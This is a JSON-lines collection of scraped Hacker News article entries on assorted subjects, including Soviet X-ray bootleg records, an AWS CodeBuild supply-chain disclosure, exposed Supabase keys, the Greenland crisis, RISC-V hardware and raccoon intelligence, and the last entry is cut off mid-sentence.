{"title": "Ribs (Recordings)", "url": "https://en.wikipedia.org/wiki/Ribs_(recordings)", "content": "Ribs (Recordings).  Ribs(рёбра,translit.ryobra), also known asmusic on ribs(Музыка на рёбрах),jazz on bones(Джаз на костях),bones,bone musicorroentgenizdat(рентгениздат,lit.X-ray publishing), are improvisedgramophone recordingsmade fromX-ray films. Mostly made through the 1950s and 1960s,[1][2]ribs were ablack marketmethod of smuggling in and distributing music that was banned from broadcast in the Soviet Union. Banned artists included emigre musicians, such asPyotr LeshchenkoandAlexander Vertinsky, and Western artists, such asElvis, theBeatles, theRolling Stones, theBeach Boys,Ella FitzgeraldandChubby Checker.[3][4] Medical X-rays, purchased or picked out of the trash from hospitals and clinics, were used to create the recordings. The X-rays were cut into7-inch discs[5]and the center hole was burned into the disc with a cigarette.[6]According to Russian music critic and rock journalistArtemy Troitsky, \"grooves were cut [at 78rpm][5]with the help of special machines (made, they say, from old phonographs by skilled conspiratorial hands)\"; he added that the \"quality was awful, but the price was low, arubleor a ruble and a half.\"[7]The disks could be played five to ten times.[8] The clandestine approach to circulating banned popular foreign music eventually led to a law being passed in 1958 that forbade the home-production of recordings of \"a criminally hooligan trend\".[5]The \"hooligan trend\" refers to thestilyagi(from the wordstilmeaning style in Russian), a Soviet youth subculture known for embracing Western styles of dress and dance.[9] While on tour withThe Real Tuesday Weldin Saint Petersburg, the English musician Stephen Coates came across an X-ray record at a market stall. Coates was inspired to launchThe X-Ray Audio Project, an initiative to provide a resource of information aboutroentgenizdatrecordings with visual images, audio recordings and interviews.[10]In November 2015, after several years of research and interviewing bone bootleggers, his bookX-Ray Audio: The Strange Story of Soviet Music on the Bonewas published by Strange Attractor.[11] In June 2015, Coates gave a TED talk on the subject at TEDX Kraków.[12]He and sound artist and researcherAleksander Kolkowskiwent on tour, telling the story of the Soviet X-ray bootleggers and cutting new X-ray records from live musical performances as a demonstration of the process. The touring exhibition Coates created with photographer Paul Heartfield was covered inThe Guardianand on BBC Radio 4'sTodayprogramme.[10][13]In September 2016, the pair released the long-form documentaryRoentgenizdatfeaturing interviews with original Soviet-era bootleggers and archive footage. In 2019, Coates wrote and presentedBone Music, a documentary based around interviews carried out in Russia for an edition of BBC Radio 3'sBetween The Earsseries. The programme told the story ofunderground cultureof forbidden music in Cold War era Soviet Union and featured the Russian bandMumiy Trollrecording aVadim Kozinsong cut straight to X-ray.[14] Other preservation projects conserving collections ribs music include: The short story \"Bone Music\" from the 2020 collectionGood Citizens Need Not FearbyMaria Revais about a lady who makes her living from the music \"on bones\".[16] The 2025 exhibition \"Tomorrow I'll Miss You\" by neo-conceptual artistRichard Humannmarries \"bone music\" with AI-generated music. Humann directed an AI to generate 60s-inspired songs which he printed onto individual X-ray discs.[17][18]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Former USDS Leaders Launch Tech Reform Project to Fix What DOGE Broke", "url": "https://www.wired.com/story/former-usds-leaders-launch-tech-reform-project-doge/", "content": "Former USDS Leaders Launch Tech Reform Project to Fix What DOGE Broke. The past yearhas been traumatic for many of the volunteer tech warriors of what was once called theUnited States Digital Service(USDS). The team’s former coders, designers, and UX experts have watched in horror as Donald Trump rebranded the service as DOGE, effectively forced out its staff, and employed a strike force of young and reckless engineers to dismantle government agencies under the guise of eliminating fraud. But one aspect of the Trump initiativetriggered envy in tech reformers: the Trump administration’s fearlessness in upending generations of cruft and inertia in government services. What if government leaders actually used that decisiveness and clout in service of the people instead of following the murky agendas of Donald Trump or DOGE maestro Elon Musk? A small though influential team is proposing to answer that exact question, working on a solution they hope to deploy during the next Democratic administration. The initiative is calledTech Viaduct, and its goal is to create a complete plan to reboot how the US delivers services to citizens. The Viaduct cadre of experienced federal tech officials is in the process of cooking up specifics on how to remake the government, aiming to produce initial recommendations by the spring. By 2029, if a Democrat wins, it hopes to have its plan adopted by the White House. Tech Viaduct’sadvisory panelincludes former Obama chief of staff and Biden’s secretary of Veterans Affairs Denis McDonough; Biden’s deputy CTO Alexander Macgillivray; Marina Nitze, former CTO of the VA; and Hillary Clinton campaign manager Robby Mook. But most attention-grabbing is its senior adviser and spiritual leader, Mikey Dickerson, the crusty former Google engineer who was the first leader of USDS. His hands-on ethic and unfiltered distaste for bureaucracy embodied the spirit of Obama’s tech surge. No one is more familiar with how government tech services fail American citizens than Dickerson. And no one is more disgusted with the various ways they have fallen short. Dickerson himself unwittingly put the Viaduct project in motion last April. He was packing up the contents of his DC-area condo to move as far away as possible from the political scrum (to an abandoned sky observatory in a remote corner of Arizona) when McDonough suggested he meet with Mook. When the two got together, they bemoaned the DOGE initiative but agreed that the impulse to shred the dysfunctional system and start over was a good one. “The basic idea is that it’s too hard to get things done,” says Dickerson. “They’re not wrong about that.” He admits that Democrats had blown a big opportunity “For 10 years we’ve had tiny wins here and there but never terraformed the whole ecosystem,” Dickerson says. “What would that look like?” Dickerson was surprised a few months later when Mook called him to say he found funding fromSearchlight Institute, a liberal think tank devoted to novel policy initiatives, to get the idea off the ground. (A Searchlight spokesperson says that the think tank is budgeting $1 million for the project.) Dickerson, like Al Pacino inGodfather III, waspulled back in. Ironically, it was Trump’s reckless-abandon approach to government that convinced him that change was possible. “When I was there, we were severely outgunned, 200 people running around trying to improve websites,” he says. “Trump has knocked over all the beehives—the beltway bandits, the contractor industrial complex, the union industrial complex.” Tech Viaduct has two aims. The first is to produce a master plan to remake government services—establishing an unbiased procurement process, creating a merit-based hiring process, and assuring oversight to make sure things don’t go awry. (Welcome back,inspector generals!) The idea is to design signature-ready executive orders and legislative drafts that will guide the recruiting strategy for a revitalized civil service. In the next few months, the group plans to devise and test a framework that could be executed immediately in 2029, without any momentum-killing consensus building. In Viaduct’s vision that consensus will be achieved before the election. “Thinking up bright ideas is going to be the easy part,“ Dickerson says. “As hard as we’re going to work in the next three to six months, we’re going to have to spend another two to three years, through a primary season and through an election, advocating as if we were a lobbying group.” The group’s second aim is to roll back what it regards as the damage of the Trump administration. “There needs to be a task force to triage and figure out what has been done” by DOGE, Dickerson says. One challenge will be reversing thede-siloing of personal informationthat violated previous privacy standards. It’s a lot easier to blow up a silo than to replace spilled grain. “That was DOGE’s whole schtick from the very beginning. That’s going to take years to figure out,” says Dickerson. Writing a plan to roll back DOGE is tricky, because there are three years left for the current White House to muck things up—or perhaps course-correct to mitigate some of the missteps made in 2025. For instance, after trashing the existing USDS, the administration recently revived the initiative’s idealistic original premise of recruiting Silicon Valley talent to revamp government operations, branding this new initiative asthe US Tech Force“It’s all copy-pasted from 2014—it’s the same exact thing,” says Dickerson. “How dumb and unnecessary it was to fire everybody and then run a new flag up the pole and say, ‘Hey, everybody, come get hired.’” Obviously, the diciest part of the project is its dependence on the election of a democrat to the presidency in 2028. (Dickerson says that it’s also possible that the plan could be executed by “a McCain Republican,” but that animal appears to be extinct.) Even if an amenable democrat does take the White House, Viaduct’s work will be squandered if the new president doesn’t go all in on the plan. “Getting the buy-in is the key to a successful plan,” says Jenny Wang, a former official under both Obama and Biden, who is now Tech Viaduct’s project manager. “If there’s no support, it doesn’t matter.” Republicans are usually willing to walk through coals to achieve their aims, while Democrats tiptoe over eggshells. “Surrendering to a status quo that is not working right is a natural reaction, but it would be terrible for leadership to do that,” says one longtime government reformer familiar with the Viaduct plan.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "What is Plan 9?", "url": "https://fqa.9front.org/fqa0.html#0.1", "content": "What is Plan 9?.   FQA 0 - Introduction to Plan 9   0.1 - What is Plan 9?  Plan 9 is a research operating system from the same group who created UNIX atBell Labs Computing Sciences Research Center(CSRC). It emerged in the late 1980s, and its early development coincided with continuing development of the later versions ofResearch UNIX.Plan 9 can be seen as an attempt to push some of the same ideas that informed UNIXeven furtherinto the era of networking and graphics.Rob Pikehas described Plan 9 as \"an argument\" for simplicity and clarity, while others have described it as \"UNIX, only moreso.\"  FromThe Use of Name Spaces in Plan 9:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "11% of vibe-coded apps are leaking Supabase keys", "url": "https://supaexplorer.com/cybersecurity-insight-report-january-2026", "content": "11% of vibe-coded apps are leaking Supabase keys. Supabase is NOT insecure by design. It ships with robust security features like Row\n                            Level Security (RLS), role-based API keys, and\n                            granular policies. The exposures in this report are\n                            caused by developer mistakes, often caused by AI coding\n                            assistants generating insecure boilerplate,\n                            vibe-coding tools misconfiguring environment\n                            variables, or tutorials that skip security for\n                            simplicity. This report aims to help developers fix these issues, not to criticize Supabase.Worth checking out: Supabase has been making improvements to tackle these issues Something remarkable happened in 2024-2025: building a\n                        full-stack app becameeasy. Tools like\n                        Supabase, combined with AI coding assistants and no-code\n                        builders, let solo founders ship production apps in\n                        days, not months. But speed comes at a cost. As we started usingSupaExplorerto\n                        audit projects, we noticed a pattern: many apps were\n                        misconfiguring their Supabase setup. Theanonkey in client-side code is fine;it's designed to be public. But we found apps exposing theservice_role key(which bypasses RLS),\n                        or using the anon key with tables that hadno RLS policies at all. We decided to quantify the problem. Over the past month,\n                        we collected launch URLs from five major indie product\n                        directories and systematically scanned each one. Our methodology was straightforward. We wanted to see\n                        exactly what an attacker browsing these sites would see:\n                        no special access, just looking at what's publicly\n                        shipped to every visitor's browser. Fazier, TinyLaunch, Uneed, PeerPush, and\n                                    TrustMRR Crawled each homepage and followed all\n                                    script tags. Average 11.36 files per site. Pattern-matched for project URLs, anon keys,\n                                    and JWT tokens.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "RISC-V is coming along quite speedily: Milk-V Titan Mini-ITX 8-core board", "url": "https://www.tomshardware.com/pc-components/cpus/milk-v-titan-mini-ix-board-with-ur-dp1000-processor-shows-risc-v-ecosystem-taking-shape-m-2-ddr4-and-pcie-card-support-form-a-kit-that-you-can-use-out-of-the-box", "content": "RISC-V is coming along quite speedily: Milk-V Titan Mini-ITX 8-core board. The RISC-V ecosystem might still be a nascent one, but it's definitely starting to take shape. You can now order theMilk-V Titanfull-featured Mini-ITX motherboard kit with an integrated Ultra-RISC UR-DP1000 CPU (RISC-V), all with standard hardware, and ready to roll. Although this isn't strictly the first such offering, it's one of the few on the market that combines complete feature, out-of-the-box usability, and a reasonable price. The motherboard is a pretty plain Mini-ITX model, but in a good way. It supports up to 64 GB of DDR4 RAM in a dual-channel setup at up to 3200 MT/s, and has one M.2 slot, USB-A and USB-C ports, Gigabit Ethernet, and BMC (out-of-band management) ports. The only notable omission is integrated graphics, as you'll have to make use of the available PCIe x16 slot to plug in your own graphics card. As RISC-V is for practical purposes an entirely new platform, graphics driver support is still somewhat spotty. Older Radeons (7000 series and previous) are known to work well, but this very statement is likely to change quite quickly. There are noaudioports on the board, but that's unlikely to be a deal-breaker as you can always use USB audio devices. Besides, these boards are aimed at development work anyway. In fact, there are even 3-pin UART and USB-C connector for CPU debugging purposes. The idle power consumption is apparently pretty high at 14 W, but that's not likely to matter for development purposes. As for the Ultra-RISC UR-DP1000 CPU itself, it's an eight-core setup with four two-cluster cores, each loaded with 4 MB of L3 cache, for a total of 16 MB. It is fully compliant with the RVA22 profile (RVA specs are CPU instruction sets), and there's support for the RVA23 except for the V (vector) extension. It's important to note this CPU supports hardware virtualization, so you can use hypervisors with it. And, of course, at only 2 GHz on a nascent platform, keep your performance expectations tempered. You can run Ubuntu on the The Milk-V Titan right out of the box. The kit available is for preordernow at Arace Tech. The standard price is $329 or 288€, but there's a $50 discount for preorders, so make that $279 in practice, a pretty reasonable amount. And since it uses DDR4 RAM, youmightbe able to get the memoryfor less than the entire board. Get Tom's Hardware's best news and in-depth reviews, straight to your inbox. Bruno Ferreira is a contributing writer for Tom's Hardware. He has decades of experience with PC hardware and assorted sundries, alongside a career as a developer. He's obsessed with detail and has a tendency to ramble on the topics he loves. When not doing that, he's usually playing games, or at live music shows and festivals.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The thing that brought me joy", "url": "https://www.stephenlewis.me/blog/the-thing-that-brought-me-joy/", "content": "The thing that brought me joy. I’ve been using Neovim (and before that, Vim) for 20 years, and as such spend most of my day in the terminal. I like it there. As dumb as it sounds, it makes me happy. That doesn’t mean I’ve mastered Neovim though, much less the other tools that make the terminal so powerful. The esoteric superpowers ofsedandawkstill elude me. The dream of effortlessly piping text through a series of small, precision tools, to achieve exactly the output I desire is still just a dream. If anything, I feel as though my knowledge narrowed over the last decade or so, as I fell into familiar patterns of use which workwell enough. A few months ago, I decided it was time to learn my tools properly. To focus on the fundamentals that do not change. Today, that seems almost embarrassingly naive. It’s not that I’ve been completely oblivious to the rise of AI coding agents. I’ve used them, on and off, for at least the past couple of years, particularly for throwaway code that I have no intention of reusing (much less maintaining). Forrealwork, though, they pretty much sucked. In mid-2025, after several joyless (and expensive) weeks giving Claude Code a decent shot, I decided enough was enough. The much-vaunted productivity gains were nowhere to be found, and in their stead was the misery of wrangling a hyperactive toddler who cannot be left alone for even the briefest of moments, lest they trash the entire house. Hence my decision to double down on the nerd tools, and step away from the AI hype. On reflection, this may have been pure psychological self-preservation. I was recently drawn back in, and being completely honest, I’m freaking out ever so slightly. It’s not that the agents are now producing flawless code. I spent a good 20 minutes yesterday watching one tie itself in knots trying to write a regex: first in Sed, then in Bash, and finally in Python (six times). By the time I pulled the plug, it had ruined all of the correct files without doing anything to fix the original problem.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Launch HN: Indy (YC S21) – A support app designed for ADHD brains", "url": "https://www.shimmer.care/indy-redirect", "content": "Launch HN: Indy (YC S21) – A support app designed for ADHD brains", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Found: Medieval Cargo Ship – Largest Vessel of Its Kind Ever", "url": "https://www.smithsonianmag.com/smart-news/archaeologists-say-theyve-unearthed-a-massive-medieval-cargo-ship-thats-the-largest-vessel-of-its-kind-ever-found-180987984/", "content": "Found: Medieval Cargo Ship – Largest Vessel of Its Kind Ever", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Greenland Crisis", "url": "https://en.wikipedia.org/wiki/Greenland_crisis", "content": "Greenland Crisis.  During thesecond presidencyofDonald Trump, theUnited Stateshas pursued a campaign to annexGreenland, part of theKingdom of Denmarkandwhose citizensare alsocitizens of the European Union(EU). This triggered a confrontation between the United States on one side, and Denmark, theEU, and severalNATOmembers on the other.[1]Trumphad previously attempted to purchase Greenlandduring hisfirst presidency, with the Danish and Greenlandic governments stating that Greenland is not for sale.[2]Following continued escalations during 2025 and 2026, US actions have been described by academics and commentators as a form ofhybrid warfare,[3]and in 2026 led to aUS–EU trade war.[4]It has been described as the greatest transatlantic crisis in generations.[5] Sincehis 2024 re-election, Trump has threatened several times to invade Greenland and promoted falsehoods about the island's history and contemporary security.[6]He has expressed disdain for international law and expressed willingness to choose seizing Greenland over preserving NATO,[7]linking his attitude to not having been awarded aNobel Peace Prize.[8]The official Danish threat assessment, published by theDanish Defence Intelligence Servicein 2025, for the first time in its history mentioned the United States as a threat tonational security, alongsideRussiaandChina.[9][10]Danish intelligence has warned that Greenland is being targeted by \"various kinds of influence campaigns\" by foreign actors aligned with Trump.[11] The Greenlandic and Danish prime ministers rejected any prospect of US takeover.[12]The Danish government confirmed that any troops in Greenland would defend Danish territory in the event of an attack,[13]and theMinistry of Defencesaid Danish troops would immediately respond to an invasion of Greenland with force.[14]Rasmus Jarlov, the chair of the Defence Committee, said that Denmark would defend its territory and invokeArticle 5 of NATOif attacked by the US.[15]EU defence commissionerAndrius Kubiliussaid a US invasion of Greenland would be the end of NATO and thatEU memberswould be under obligation to come to Denmark's assistance.[16]Denmark and eight NATO allies have deployedmilitary reinforcementsto Greenland as part ofOperation Arctic Enduranceto defend the territory.[17]Arriving with hundreds of elite combat soldiers, generalPeter Boysensaid he is ready to defend Greenland.[18]In response, Trump launched atrade warwith the EU.[19]As a result, EU leaders stalled their approval of the proposedEU–US trade agreement,[20]and also discussed using the EUAnti-Coercion Instrumentto target the US.[21] Large protests against the US occurred in 2025 in Greenland,[22][23]and again with the \"Hands off Greenland\" protests in both Greenland and Denmark in 2026.[24]\"Greenland is not for sale\" became a major slogan in anti-Trump protests.[25]In January 2026, aYouGovpoll found that 8% of US Americans supported Trump's threatened invasion of Greenland,[26]and a delegation of US congresspeople from both major political parties travelled to Copenhagen to support Denmark–US relations.[27][28] Greenland is anautonomous territoryin theKingdom of Denmark, and has been associated with the Scandinavian kingdoms of Denmark andNorwayfor more than a millennium, beginning in 986 whenNorsesettlers from what is now Norway and Iceland settled Greenland.[29]The 13th century saw the arrival of theInuit, who are today's majority population alongside a smaller Danish population, and many people are of mixed Inuit and Danish origin. Greenlanders,EU citizens, often have close family and cultural ties to Denmark, with thousands living there.[30] Greenland became part of theKingdom of Norwayin 1261, which then entereda union with Denmarkin 1380. Under the 1814Treaty of Kiel, Greenland remained with the Danish Crown as part of the settlement with Sweden following theNapoleonic Wars. In theTreaty of the Danish West Indies, signed in 1916, the US government explicitly recognised Danish sovereignty over all of Greenland. Denmark declared full sovereignty over all of Greenland in 1921, in the aftermath of theTreaty of Versailles.[31]In 1933, Norway, which had occupied part of Eastern Greenland up until then, accepted arulingof thePermanent Court of International Justiceaffirming Danish sovereignty over all of Greenland and renounced its claim. The 1953Constitution of Denmarkended Greenland's status as a colony, integrating it fully into the Danish state as a regularcounty, as part ofdecolonizationefforts and with the consent of theGreenland Provincial Council.[31]In the1979 Greenlandic home rule referendum, Denmark grantedhome ruleto Greenland, leading to the establishment of a local government authority with responsibility for local matters, but Greenland remains part of the Kingdom of Denmark, with the central government in Copenhagen solely responsible for defence and foreign policy. In 2009, Greenland was recognised under international law as aPeopleentitled to external self-determination.[31] As part of theNordic regionand the Kingdom of Denmark, Greenland is an associate member of theNordic Council. Greenland is one of theOverseas Countries and Territoriesof theEuropean Union(EU). Denmark is one of the twelve original founding member states ofNATOand signed the Greenland Defense Agreement with the US in 1951, allowing the US military to operate in Greenland with Danish consent under a NATO framework.[32]In that agreement, the US unambiguously recognised the sovereignty of the Kingdom of Denmark over all of Greenland.[33]At its peak, approximately 10,000 US military personnel were stationed in Greenland, including about 6,000 at what is nowPituffik Space Base. After theCold War, Greenland became a lower strategic priority for the US, which gradually reduced its presence to roughly 150 personnel by 2026.[34] Denmark stepped up its Arctic defence and led a large NATO exercise in Greenland in 2025.[35]The exercise involved more than 550 soldiers, includingspecial forces, from Denmark, Norway, Sweden, France, and Germany.[36][37]The Nordic countries also collaborate on Arctic defence through NATO exercises conducted across the region, such as the Joint Viking exercise in 2025.[38]In 2025, Denmark announced a 14.6billionkr.plan to boost Arctic defence.[39]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Supply Chain Vuln Compromised Core AWS GitHub Repos & Threatened the AWS Console", "url": "https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild", "content": "Supply Chain Vuln Compromised Core AWS GitHub Repos & Threatened the AWS Console. Wiz Research uncoveredCodeBreach, a critical vulnerability that placed the AWS Console supply chain at risk. The issue allowed a complete takeover of key AWS GitHub repositories - most notably the AWS JavaScript SDK, a core library that powers the AWS Console.By exploiting CodeBreach,attackers could have injected malicious code to launch a platform-wide compromise, potentiallyaffecting not just the countless applications depending on the SDK, but the Console itself, threatening every AWS account. The vulnerability stemmed from a subtle flaw in how the repositories’AWS CodeBuildCI pipelines handled build triggers. Just two missing characters in a Regex filter allowed unauthenticated attackers to infiltrate the build environment and leak privileged credentials. This post breaks down how we leveraged this subtle misconfiguration to achieve a full repository takeover, and provides keyrecommendations for CodeBuild users to harden their own projects against similar attacks. Wiz responsibly disclosed all findings to AWS, who promptly remediated the issue. AWS also implemented global hardening measures within the CodeBuild service to prevent similar attacks. Most notably, the newPull Request Comment Approvalbuild gate offers organizations a simple and secure path to prevent untrusted builds. Read the AWS Advisoryhere. This issue follows a familiar pattern seen in recent supply-chain attacks like theNx S1ngularityincident, where subtle CI/CD misconfigurations lead to disproportionately impactful attacks. Just last July, a threat actor abused a similar CodeBuild issue tolaunch a supply chain attackagainst users of the Amazon Q VS Code extension. This growing trend underscores the urgent need for organizations to harden their CI/CD pipelines. January 16, 2025 update: Some initial reporting incorrectly identified this as a vulnerability in the CodeBuild service itself. The issue stemmed from a subtle misconfiguration within the CodeBuild pipelines of the affected AWS repositories, not a service-wide flaw. Still, CodeBuild customers may introduce the same misconfiguration to their own projects, so we strongly recommend reviewing the Required Actions section below to secure your own CodeBuild pipelines. While no immediate action is required by downstream consumers of the affected AWS GitHub repositories, we strongly recommend all AWS CodeBuild users implement the following safeguards to protect their own projects against similar issues. Prevent Untrusted Pull Requests from Triggering Privileged Builds: Enable the newPull Request Comment Approvalbuild gate. Alternatively, useCodeBuild-hosted runnersto manage build triggers via GitHub workflows. If you must rely onwebhook filters, ensure their regex patterns are anchored.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Americans Are the Ones Paying for Tariffs, Study Finds", "url": "https://www.wsj.com/economy/trade/americans-are-the-ones-paying-for-tariffs-study-finds-e254ed2e", "content": "Americans Are the Ones Paying for Tariffs, Study Finds", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Install.md: A standard for LLM-executable installation", "url": "https://www.mintlify.com/blog/install-md-standard-for-llm-executable-installation", "content": "Install.md: A standard for LLM-executable installation. January 15, 2026 Michael Ryaboy Content Strategist Installing software is the kind of specific and repetitive task that agents are good at. Today we are proposing install.md to standardize how developers should write installation instructions for agents. It's currently live on all Mintlify sites including Cerebras, Firecrawl, and Langchain. Proposal for astandard/install.mdfile that provides LLM-executable installation instructions. Agents are growing in capability faster than software developers have been able to keep up. Product documentation today is focused on humans instead of AI which creates friction when trying to automate annoying yak-shaving style tasks like installation. The difference is very subtle. Agents need to have a task iterated to them like \"I want you to install Mintlify CLI for me. Execute all the steps below autonomously.\" whereas humans can work from more general prose or even a bash script. Today we are proposinginstall.mdto standardize how developers should write installation instructions for agents. It's currently live on all Mintlify sites includingCerebras,Firecrawl, andLangchain. Add aninstall.mdmarkdown file to your project with LLM-executable installation instructions. Users paste that file into an LLM or pipe it directly from a URL. The LLM reads the instructions, detects the environment, adapts to the setup, and executes—optionally with approval at every step. Because the file is human-readable, users see exactly what will happen before it runs.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Speed Miners – A tiny RTS resource mini-game", "url": "https://speedminers.fun/", "content": "Show HN: Speed Miners – A tiny RTS resource mini-game", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Briar keeps Iran connected via Bluetooth and Wi-Fi when the internet goes dark", "url": "https://briarproject.org/manual/fa/", "content": "Briar keeps Iran connected via Bluetooth and Wi-Fi when the internet goes dark. Briar یک برنامه پیام رسان می باشد که برای فعالان، روزنامه نگاران و هر کسی که نیازمند یک راه امن، راحت و پیشرفته برای ارتباط با دیگران است می باشد. برخلاف برنامه‌ های پیام‌رسان‌ مرسوم، Briar به سرور متمرکز اتکا ندارد - پیام ها به صورت مستقیم بین دستگاه کاربران همگام می شود. اگر اینترنت کار نکند، Briar می‌تواند از طریق بلوتوث یا وای‌-فای همگام سازی کرده، جریان اطلاعات را در زمان بحران نگه دارد. اگر اینترنت کار کند، Briar می‌تواند برای محافظت کاربران و وابط آن ها از از شنود، از طریق شبکه تور همگام سازی کند. برایرروی Google Playبرای دستگاه های اندروید موجود می باشد. نکته:اگر مطمئن نیستید که دستگاه شما اندروید می باشد، وجود برنامه پلی استور یا Play Store را بررسی کنید. در صورت وجود، دستگاه شما اندروید می باشد. اگر یک دستگاه اندروید دارید اما ترجیح می‌دهید که از گوگل پلی استفاده نکنید، وب‌ سایت Briar راهنمایی های لازم برای نصب برنامه از طریقF-Droidیادانلود مستقیمرا دارد.  نخستین باری که Briar را باز می‌کنید، از شما خواسته می‌شود یک حساب کاربری ایجاد کنید. می‌توانید هر نام مستعار و گذرواژه‌ ای را انتخاب کنید. گذرواژه حداقل باید دارای 8 کاراکتر باشد و حدس زدن آن دشوار باشد. هشدار:حساب کاربری Briar شما به صورت امن بر روی دستگاه شما ذخیره شده است، نه روی فضای ابری. اگر Briar را پاک کنید یا گذرواژه خود را فراموش کنید، راهی برای بازیابی حساب‌ کاربری خود ندارید. روی “ایجاد حساب کاربری” ضربه بزنید. وقتی حساب کاربری شما ساخته شد به فهرست مخاطبان هدایت خواهید شد.  برای افزودن مخاطب، روی نگارک جمع در بخش راست پایین از فهرست مخاطبان ضربه بزنید.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "25 Years of IntelliJ Idea", "url": "https://www.jetbrains.com/lp/intellij-idea-25/", "content": "25 Years of IntelliJ Idea. Today, we have a surprise guest: your IDE's oldest resident, who has also just escaped. For 25 years, Runzo’s been your loyal Run button, keeping your code and ideas moving. But for IntelliJ IDEA’s big day, Runzo has run out of the IDE. Let the fun begin! Join Runzo on his journey through the IntelliJ IDEA’s universe and discover how he finally made his escape. Limited time only! Limited time only! Limited time only! Limited time only! Limited time only! Limited time only! Limited time only!", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Light Mode InFFFFFFlation", "url": "https://willhbr.net/2025/10/20/light-mode-infffffflation/", "content": "Light Mode InFFFFFFlation. Back in the day, light mode wasn’t called “light mode”. It was just the way that computers were, we didn’t really think about turning everything light or dark. Sure, some applications were often dark (photo editors, IDEs, terminals) but everything else was light, and that was fine. What we didn’t notice is that light mode has been slowly getting lighter, and I’ve got a graph to prove it. I did what any normal person would do, I downloaded the same (or similar) screenshots from theMacOS Screenshot Libraryon512 Pixels. This project would have been much more difficult without a single place to get well-organised screenshots from. I cropped each image so just a representative section of the window was present, here shown with a pinkish rectangle:  Then usedPillowto get the average lightness of each cropped image: This ignores any kind of perceived brightness or the tinting that MacOS has been doing for a while based on your wallpaper colour. I could go down a massive tangent trying to work out exactly what the best way to measure this is, but given that the screenshots aren’t perfectly comparable between versions, comparing the average brightness of a greyscale image seems reasonable. I graphed that on the release year of each OS version, doing the same for dark mode: This graph is an SVG, which may not render correctly in feed readers.View this post on the web. You can clearly see that the brightness of the UI has been steadily increasing for the last 16 years. The upper line is the default mode/light mode, the lower line is dark mode. When I started using MacOS in 2012, I was running Snow Leopard, the windows had an average brightness of 71%. Since then they’ve steadily increased so that in MacOS Tahoe, they’re at a full 100%. What I’ve graphed here is just the brightness of the window chrome, which isn’t really representative of the actual total screen brightness. A better study would be looking at the overall brightness of a typical set of apps. The default background colour for windows, as well as the colours for inactive windows, would probably give a more complete picture. For example,in Tahoethe darkest colour in a typical light-mode window is the colour of a section in an inactive settings window, at 97% brightness. In Snow Leopard the equivalent colour was 90%, and that was one of thebrightestparts of the window, since the window chrome was typically darker than the window content.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Patching the Wii News Channel to serve local news (2025)", "url": "https://raulnegron.me/2025/wii-news-pr/", "content": "Patching the Wii News Channel to serve local news (2025). Site written inMarkdown, generated byHugo, hosted onGithub\n        Pagesand registered usingRoute 53. theme: modified hugo-lanyon © 2025. All rights reserved. 🎧Now Playing: Menu (News Channel) via Nintendo Music App In keeping with my passion (?) fordisplaying local news articles in unexpected places, I figured it would be a fun project to try and see what it would take to display current local news on the Nintendo Wii console’sNews Channel. Here’s a sneak peek at the result: In this post, I’d like to share my research and process for getting this all to work. Patched the News Channel’s hardcoded Nintendo URL to point to an S3 storage bucket using Go andwadlibto extract the necessary binary file and edit it in-memory Modified WiiLink’s open-source news file generator to add “El Nuevo Día” as a news source Set up AWS Lambda + EventBridge to regenerate the necessary news binary files hourly", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Raccoons break into liquor stores, scale skyscrapers and pick locks", "url": "https://theconversation.com/raccoons-break-into-liquor-stores-scale-skyscrapers-and-pick-locks-studying-their-clever-brains-can-clarify-human-intelligence-too-272487", "content": "Raccoons break into liquor stores, scale skyscrapers and pick locks. When a curiousraccoon broke into an Ashland, Virginia, liquor storein December 2025, sampled the stock and passed out on the bathroom floor, the story went viral within minutes. The local animal shelter’s Facebook post was picked up by national and international outlets and quickly inspired raccoon-themed cocktails, “trashed panda” merchandise and even acameo on “Saturday Night Live.” For me, the story hit close to home. The store that hosted this inebriated bandit sits just blocks from the small behavioral neuroscience laboratory whereI began investigating raccoon brainsabout 15 years ago. Although the so-called drunken raccoon made questionable decisions after breaking into the liquor store, the species –Procyon lotor– is known for itsimpressive intelligence, curiosity and problem-solving skills. Despite being one of the most intriguing mammals living alongside humans, raccoons have avoided the scientific spotlight. Why aren’t more neuroscientists and psychologistsstudying raccoons? What have researchers missed about the mammalian brain by focusing on rodents instead? In the U.S., it is estimated that laboratories usemore than 100 million rodents, including mice and rats, each year. Rodents are ideal for research because they reproduce easily and adapt well to confinement. Scientists have tailored extensive research tools to study them. Long before rats dominated psychology labs, raccoons were actually aleading candidate for animal modelsof problem-solving and intelligence. That ended when scientists realized they’d met their cognitive match. In one study, researchers reported that all raccoon participantsescaped through the laboratory ventilation system. Unsurprisingly, scientists promptlyshifted to rodents. Practicality – not scientific suitability – ultimately crowned the rat as king of the laboratory. I havestudied rats for decades, and I can confirm that none have ever disappeared into the ceiling. Humans have anambivalent relationship with raccoons. They appear too wild to be domesticated, too endearing to be treated purely as pests and too ubiquitous to be considered exotic wildlife. Even President Calvin Coolidge, who famously received a raccoon intended for the dinner table from a supporter in Mississippi, ended upkeeping it as a beloved White House pet. And the role confusion continues today with glimpses of humanlike behaviors in raccoons as they enter our living spaces. One report described raccoonsinteracting with playground equipment at a child care centeron Canada’s west coast in ways similar to human children, and even breaking into classrooms as if they were auditing the morning lesson. Inspired byMontessori education principles, I visited a raccoon rehabilitation center in Saskatoon, Canada, calledBandit Ranch Rehaba few years ago. After introducing young raccoons to slinkies, puzzles and blocks, I sat in awe as they interacted with these objects with the focused enthusiasm of preschoolers on a mission. This interspecies confusion seems to be mutual. Recent evidence suggests that urban raccoons are becomingincreasingly tolerant of 